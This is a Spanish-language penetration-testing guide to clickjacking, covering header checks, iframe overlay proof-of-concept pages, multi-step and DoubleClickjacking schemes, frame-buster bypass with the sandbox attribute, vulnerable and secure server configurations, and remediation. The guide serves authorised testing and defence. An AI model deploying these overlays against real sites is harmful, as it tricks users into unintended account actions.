# Secuestro de clics (Clickjacking / UI redressing)

| Clasificación | |
|---|---|
| CWE | CWE-1021 — Restricción incorrecta de capas o marcos de interfaz renderizados |
| OWASP Top 10:2025 | A02 — Security Misconfiguration (cabeceras de framing ausentes); A06 — Insecure Design si la acción sensible carece de confirmación |
| OWASP API Top 10:2023 | No aplica (salvo paneles web de APIs) |
| WSTG | WSTG-CLNT-09 |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura · 4. Explotación (PoC básica, multipaso, formularios precargados, DoubleClickjacking) · 5. Evasión de protecciones · 6. Escalada · 7. Caja blanca · 8. Falsos positivos / cuándo es informativo · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

El atacante carga la página objetivo dentro de un `<iframe>` transparente sobre una página señuelo, de forma que el clic que la víctima cree dar en el señuelo cae en un botón real de la aplicación (borrar cuenta, aceptar permisos OAuth, activar una opción de privacidad). Ocurre porque la aplicación no indica al navegador que **no** puede ser enmarcada por otros orígenes mediante `Content-Security-Policy: frame-ancestors` o `X-Frame-Options`.

Para que sea **real** hacen falta además: que la víctima esté autenticada **dentro del iframe** (las cookies deben viajar en un contexto de tercero) y que la acción se complete con uno o pocos clics sin datos que el atacante no pueda predecir.

## 2. Dónde buscar (señales del reconocimiento)

- Respuestas HTML autenticadas sin `frame-ancestors` en la CSP ni `X-Frame-Options`.
- Acciones de un clic: «Eliminar», «Confirmar», «Autorizar aplicación», «Hacer público», «Desactivar MFA», «Aceptar invitación», botones de pago con tarjeta guardada.
- Formularios que se **precargan desde la URL** (`/settings?email=…`): el atacante rellena y la víctima solo pulsa «Guardar».
- Pantallas de consentimiento OAuth y de conexión de integraciones.
- Atributos de cookie de sesión: `SameSite=None` hace viable el ataque; `Lax`/`Strict` lo impiden en iframes cross-site.

## 3. Detección segura (primeras sondas, no destructivas)

```bash
curl -s -D - -o /dev/null -H "Cookie: session=<sesion-prueba>" https://t.example/settings | grep -iE 'x-frame-options|content-security-policy|set-cookie'
```

Interpretación:

- `frame-ancestors 'none'` o `'self'` → protegido (prevalece sobre XFO en navegadores modernos).
- `X-Frame-Options: DENY` / `SAMEORIGIN` → protegido. `ALLOW-FROM` está obsoleto y los navegadores modernos lo ignoran (equivale a no tener protección si no hay `frame-ancestors`).
- XFO en `<meta>` → ignorado por los navegadores.
- Cabeceras solo en algunas rutas (comprobar la página de la acción concreta, no solo la portada).

Prueba en navegador con la cuenta de prueba (servir desde un dominio del auditor):

```html
<iframe src="https://t.example/settings" width="900" height="600"></iframe>
```

Comprobar que la página carga **y aparece con la sesión iniciada**.

## 4. Explotación por contexto o tecnología

### 4.1 PoC básica (iframe semitransparente para la demostración)

```html
<!doctype html><html><head><style>
  #victima { position:relative; width:1000px; height:700px; opacity:0.3; z-index:2; }  /* 0.0001 en ataque real; 0.3 para la captura */
  #senuelo { position:absolute; top:415px; left:80px; z-index:1; }
</style></head><body>
<div id="senuelo"><button>Reclamar premio</button></div>
<iframe id="victima" src="https://t.example/account/privacy"></iframe>
</body></html>
```

Ajustar `top`/`left` hasta que el botón señuelo quede bajo el botón real.

### 4.2 Formulario precargado por URL

```html
<iframe id="victima" src="https://t.example/account?email=auditor%2Bcj@dominio-auditor.example"></iframe>
<!-- el señuelo se coloca sobre "Actualizar correo" -->
```

### 4.3 Acciones de varios pasos

Dos señuelos («Haz clic aquí» → «Haz clic otra vez») superpuestos al botón de acción y al de confirmación. Se pueden mover con JavaScript tras el primer clic:

```html
<div id=d1 style="position:absolute;top:500px;left:60px">Paso 1</div>
<div id=d2 style="position:absolute;top:300px;left:200px;display:none">Paso 2</div>
<script>d1.onclick=()=>{d1.style.display='none';d2.style.display='block'}</script>
```

(El clic real lo recibe el iframe; los señuelos solo guían visualmente. Usar `pointer-events:none` en los señuelos).

### 4.4 Clickjacking + DOM XSS

Si un parámetro de la página enmarcada provoca XSS solo tras un clic del usuario, el clickjacking aporta ese clic (ver `vulns/xss.md`).

### 4.5 DoubleClickjacking (sin iframes)

Técnica publicada a finales de 2024 (Paulos Yibelo): la página del atacante abre una ventana nueva y pide un **doble clic**; en el `mousedown` del primer clic cambia la ventana original a la página objetivo (por ejemplo, consentimiento OAuth), de modo que el segundo clic cae sobre el botón real. Como no hay framing, `X-Frame-Options` y `frame-ancestors` **no** lo impiden. Mitigación: deshabilitar los botones sensibles hasta que haya un gesto real (movimiento de ratón o tecla) sobre la página, o pedir confirmación adicional.

```html
<!-- Esquema conceptual; no apuntar a pantallas de consentimiento reales sin autorización -->
<button onclick="w=window.open('señuelo.html','_blank','width=400,height=300')">Continuar</button>
<!-- señuelo.html: "Haz doble clic"; en onmousedown → window.opener.location='https://t.example/oauth/authorize?...'; window.close() -->
```

### 4.6 Otras variantes

- **Cursorjacking**: cursor falso desplazado del real (CSS `cursor:none` + imagen).
- **Drag-and-drop**: arrastrar datos desde/hacia el iframe (técnica antigua, muy limitada en navegadores actuales).
- **Keyjacking**: obtener pulsaciones con `focus` del iframe (limitado).

## 5. Evasión de filtros y protecciones

- **Scripts anti-framing** (*frame busters* como `if (top !== self) top.location = self.location`): se anulan con `sandbox` sin `allow-top-navigation`:
  ```html
  <iframe sandbox="allow-forms allow-scripts" src="https://t.example/settings"></iframe>
  ```
  (Si la acción necesita scripts del propio origen, añadir `allow-same-origin` puede ser necesario; eso reactiva parte del frame buster.)
- **Protección solo en algunas rutas**: buscar la misma acción en otra ruta, versión móvil (`m.`), API HTML antigua o ruta con barra final distinta.
- **`frame-ancestors` con comodines** amplios (`https://*.t.example`) + XSS o *takeover* en un subdominio.
- **XFO duplicado o contradictorio** (`DENY, SAMEORIGIN`, cabeceras repetidas): algunos navegadores lo invalidan; comprobar comportamiento real.
- **DoubleClickjacking** para saltar cabeceras (sección 4.5).

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

- Mostrar la PoC con `opacity:0.3` para que se vea la superposición, contra la cuenta de prueba.
- Elegir la acción con mayor impacto **reversible**: cambiar visibilidad de perfil, activar una opción. ⚠️ Acciones como borrar cuenta, autorizar una app OAuth en cuentas reales o pagar **requieren confirmación explícita del cliente**; demostrarlas como máximo hasta el último paso sin completarlo, o en cuenta de prueba.
- Cadenas: clickjacking en consentimiento OAuth → acceso a la cuenta (ver `vulns/oauth-oidc-saml.md`); clickjacking para disparar DOM XSS; para convertir auto-XSS en explotable.

## 7. Caja blanca: fuentes, sumideros y patrones de código

```javascript
// Express con helmet — seguro
app.use(helmet({ contentSecurityPolicy: { directives: { frameAncestors: ["'none'"] } }, frameguard: { action: 'deny' } }));
// Vulnerable: helmet desactivando la protección
app.use(helmet({ frameguard: false, contentSecurityPolicy: false }));
```

```python
# Django: XFrameOptionsMiddleware por defecto; vulnerable si se exime
@xframe_options_exempt
def settings_view(request): ...
X_FRAME_OPTIONS = 'ALLOWALL'   # valor no estándar = sin protección
```

```java
// Spring Security: vulnerable
http.headers(h -> h.frameOptions(f -> f.disable()));
// Seguro
http.headers(h -> h.frameOptions(f -> f.deny()).contentSecurityPolicy(c -> c.policyDirectives("frame-ancestors 'none'")));
```

```bash
rg -n 'frameguard:\s*false|frameOptions\(\)\.disable|frameOptions\(.*disable|xframe_options_exempt|X_FRAME_OPTIONS|X-Frame-Options|frame-ancestors|ALLOW-FROM|top\s*!==?\s*self|top\.location\s*='
```

## 8. Falsos positivos frecuentes (cuándo es informativo)

Es **informativo** (o bajo como defensa en profundidad) cuando:

- La página no tiene acciones que cambien estado ni muestra datos sensibles (portada, blog, documentación).
- La página de login sola (salvo que se demuestre un escenario concreto como login CSRF asistido).
- La cookie de sesión es `SameSite=Lax/Strict`: el iframe cross-site carga **sin sesión**. En navegadores con bloqueo/partición de cookies de terceros (Safari, Firefox con Total Cookie Protection, Brave) tampoco suele haber sesión dentro del iframe.
- La sesión vive en `localStorage`: los navegadores modernos particionan el almacenamiento en contextos de terceros, así que el iframe no ve el token.
- La acción exige escribir datos impredecibles (contraseña actual, código MFA, texto libre).
- Solo falta `X-Frame-Options` pero `frame-ancestors` está bien configurado.

Es **hallazgo real** cuando se demuestra con un navegador actual que la página se enmarca **con sesión** y una acción sensible se completa con clics.

## 9. Evidencia mínima para validarlo

- Cabeceras de la respuesta de la página afectada (sin `frame-ancestors`/XFO efectivos) y atributos de la cookie de sesión.
- PoC HTML alojada en un dominio del auditor, navegador y versión.
- Captura con el iframe semitransparente mostrando la sesión iniciada y el señuelo alineado; captura del resultado de la acción en la cuenta de prueba (y su reversión).

## 10. Severidad orientativa (vectores CVSS 3.1 y 4.0 típicos según impacto demostrado)

| Escenario | CVSS 3.1 | CVSS 4.0 (calcular con la calculadora de FIRST) |
|---|---|---|
| Cabeceras ausentes sin acción sensible | Informativo | — |
| Acción de impacto limitado | `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N` = 4.3 | `AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N` |
| Acción sensible (desactivar MFA, autorizar app, cambiar correo) | `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` = 6.5 | `AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Multipaso o dependiente de navegador | Añadir `AC:H` | `AT:P` |

## 11. Remediación (con ejemplo de código correcto)

1. `Content-Security-Policy: frame-ancestors 'none'` (o `'self'` / lista explícita de orígenes que deban enmarcar).
2. `X-Frame-Options: DENY` o `SAMEORIGIN` para navegadores antiguos.
3. Aplicar las cabeceras **en todas las respuestas HTML** (middleware global, no por ruta).
4. Cookies `SameSite=Lax` o `Strict`.
5. Confirmación adicional (contraseña, MFA, escribir el nombre del recurso) para acciones destructivas.
6. Contra DoubleClickjacking: deshabilitar botones críticos hasta detectar interacción genuina con la página (por ejemplo, tras un `pointermove`/`keydown`) y no autoaceptar en el primer clic de una ventana recién enfocada.

```nginx
add_header Content-Security-Policy "frame-ancestors 'none'" always;
add_header X-Frame-Options "DENY" always;
```

## 12. Herramientas (comando y cuándo usarla; automatización solo tras confirmación manual, nunca como primer barrido)

| Herramienta | Uso | Cuándo |
|---|---|---|
| `curl -sI` / Burp | Revisar cabeceras por ruta | Siempre, primero |
| Burp Clickbandit (*Burp → Burp Clickbandit*) | Grabar los clics y generar la PoC alineada | Tras confirmar que la página se enmarca con sesión |
| Navegador actual + PoC propia | Validación real (cookies de terceros) | Siempre antes de reportar |
| Escáneres de cabeceras (Nuclei plantillas de *missing headers*, Burp Scanner) | Inventario | Solo como inventario; no reportar sin validar impacto |

## 13. Referencias

- OWASP Clickjacking Defense Cheat Sheet; WSTG-CLNT-09.
- PortSwigger Web Security Academy — Clickjacking (UI redressing); Burp Clickbandit.
- MDN — `Content-Security-Policy: frame-ancestors`; `X-Frame-Options`.
- Paulos Yibelo — «DoubleClickjacking: A New Era of UI Redressing» (2024/2025).
- HackTricks — *Clickjacking*.
- CWE-1021.
